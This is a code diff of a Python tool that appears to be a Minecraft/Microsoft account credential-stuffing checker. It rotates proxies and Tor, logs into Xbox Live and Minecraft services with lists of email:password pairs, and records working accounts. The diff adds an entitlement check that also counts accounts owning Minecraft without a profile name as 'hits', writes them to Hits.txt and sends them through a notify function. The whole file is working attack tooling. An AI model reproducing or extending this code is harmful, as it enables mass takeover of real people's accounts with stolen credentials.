@@ -1,5 +1,4 @@
 import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, subprocess, tarfile, traceback, warnings, socket
-from time import gmtime, strftime
 from colorama import Fore
 from stem import Signal
 from stem.control import Controller
@@ -77,7 +76,7 @@ class Capture:
             try:
                 req = requests.get("https://sky.shiiyu.moe/stats/"+name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                 osbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
-            except: errors+=1
+            except: pass
             return oname, olevel, ofirstlogin, olastlogin, osbcoins, obwstars
         except: errors+=1
 
@@ -273,22 +272,29 @@ def authenticate(email, password):
                 js = xbox_login.json()
                 xbox_token = js.get('Token')
                 if xbox_token is not None:
-                    try:
-                        uhs = js['DisplayClaims']['xui'][0]['uhs']
-                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
-                        js = xsts.json()
-                        xsts_token = js.get('Token')
-                        if xsts_token is not None:
-                            try:
-                                mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
-                                access_token = mc_login.json().get('access_token')
-                                if access_token is not None:
-                                    mc, capes = account(access_token, session)
-                                    if mc != None:
+                    uhs = js['DisplayClaims']['xui'][0]['uhs']
+                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
+                    js = xsts.json()
+                    xsts_token = js.get('Token')
+                    if xsts_token is not None:
+                        mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
+                        access_token = mc_login.json().get('access_token')
+                        if access_token is not None:
+                            mc, capes = account(access_token, session)
+                            if mc != None:
+                                hit = True
+                                Capture.handle(mc, email, password, capes)
+                            else:
+                                checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
+                                if int(checkrq.status_code) == 200:
+                                    if 'game_minecraft' in checkrq.text or 'product_minecraft' in checkrq.text:
                                         hit = True
-                                        Capture.handle(mc, email, password, capes)
-                            except: pass
-                    except: pass
+                                        hits+=1
+                                        cpm+=1
+                                        checked+=1
+                                        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
+                                        if screen == "'2'": print(Fore.GREEN+f"Hit: No Name Set | {email}:{password}")
+                                        Capture.notify(email, password, "Not Set", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")
             except: pass
             if hit == False: validmail(email, password)
         if proxytype == "'4'": stop_tor(port)
